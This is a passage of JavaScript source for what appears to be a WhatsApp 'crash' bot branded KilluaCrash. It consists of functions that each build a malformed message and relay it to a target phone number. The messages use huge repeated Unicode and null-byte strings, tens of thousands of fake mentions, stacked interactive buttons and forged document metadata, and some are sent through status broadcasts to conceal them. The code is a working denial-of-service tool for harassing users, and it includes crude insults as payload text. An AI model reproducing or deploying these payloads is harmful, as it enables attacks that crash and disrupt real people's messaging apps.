                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐔𝐈 𝐒𝐢𝐬𝐭𝐞𝐦 𝐁𝐲 𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function VPen(zLoc, ptcp = false) {
    let valhalla = "𝐊𝐢𝐥𝐥𝐮𝐚𝐕𝐞𝐫𝐬𝐢𝐨𝐧1" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await client.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
 
async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "𝗡𝗶𝗸𝗮𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟱",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function nativeloc(target) {
client.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
           locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝐌𝐢𝐤𝐚𝐬𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
}
async function nativemessage(target) {
client.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: client,
              },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝗶 𝐊𝐢𝐥𝐥𝐮𝐚 𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    )
    }
async function darkflower(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎͒" + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  async function ForcloseNew(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `𝐌𝐢𝐤𝐚𝐬𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎𖣂      - 〽${"ꥈㅤㅤꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𝐌𝐢𝐤𝐚𝐬𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "KONTOL LU BENGKAK".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await client.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}
async function CrashFCxUl(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "DevKillua",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎𖣂      - 〽${"ꥈㅤㅤꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦾ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await client.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}
async function flowerColors(target) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎",
hasMediaAttachment: false
},
body: {
text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎"
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "call_permission_request",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "view_product",
buttonParamsJson: "JSON.stringify(listMessage)",
}, 
{
name: "payment_info",
buttonParamsJson: "JSON.stringify(listMessage)",
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
{
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐙𝐱𝐞𝐧𝐭𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 2.𝟎Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
}
]
}
}
}
}
}, {});
await client.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target }
});
console.log(`𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.0 ${target}`);
}
  async function Blanking(isTarget) {
let msg = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
newsletterName: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎",
serverMessageId: 1
}
},
header: {
title: "",
...(await prepareWAMessageMedia({
image: {  
url: "https://files.catbox.moe/fwo11s.jpg",
gifPlayback: true
}
}, {
upload: client.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { text: "" },
footer: { text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.0" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
},
{
name: "quick_reply",
buttonParamsJson: `{"display_text": "", "id": ""}`
},
{
name: "cta_url",
buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
},
{ name: "mpm", buttonParamsJson: "{}" },
{ name: "payment_method", buttonParamsJson: "{}" },
{ name: "call_permission_request", buttonParamsJson: "{}" },
{ name: "form_message", buttonParamsJson: "{}" },
{ name: "wa_payment_learn_more", buttonParamsJson: "{}" },
{ name: "wa_payment_transaction_details", buttonParamsJson: "{}" },
{ name: "wa_payment_fbpin_reset", buttonParamsJson: "{}" },
{ name: "catalog_message", buttonParamsJson: "{}" },
{ name: "payment_info", buttonParamsJson: "{}" },
{ name: "review_order", buttonParamsJson: "{}" },
{ name: "send_location", buttonParamsJson: "{}" },
{ name: "payments_care_csat", buttonParamsJson: "{}" },
{ name: "view_product", buttonParamsJson: "{}" },
{ name: "payment_settings", buttonParamsJson: "{}" },
{ name: "address_message", buttonParamsJson: "{}" },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: "{}" },
{ name: "open_webview", buttonParamsJson: "{}" },
{ name: "message_with_link_status", buttonParamsJson: "{}" },
{ name: "payment_status", buttonParamsJson: "{}" },
{ name: "extensions_message_v2", buttonParamsJson: "{}" },
{ name: "landline_call", buttonParamsJson: "{}" },
{ name: "review_and_pay", buttonParamsJson: "{}" },
{
name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
]
}
}
}
}
}), { userJid: isTarget, quoted: null });

await client.relayMessage(isTarget, msg.message, { messageId: msg.key.id });
}
async function CrlButton(isTarget) {
    const msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/4f153k.jpg" } }, 
                                            { upload: client.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text:"𝐊𝐢𝐥𝐥𝐮̰𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎" + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://t.me/Whhwhahwha\",\"merchant_url\":\"https://t.mw/Whhwhahwha\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: qkontak }
    );
    await client.relayMessage(isTarget, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Send By Killua ")
}
async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎ᐛ",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎ᐛ",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await client.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function CallGc(isTarget) {
await client.relayMessage(isTarget, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎" + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 't.me/Whhwhahwha',
                    }
                }
            }
        }, {});
      }
async function InVisibleX(client, target) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𑲭𑲭͠`𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎𐎟𑆻",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*⃟⃟𝗶𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎⌁⃰‌‌╴‌ᝄ*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Brummm Stututu!!*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*Brummm Stututu!!*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
        
            await client.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (client) {
                await client.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
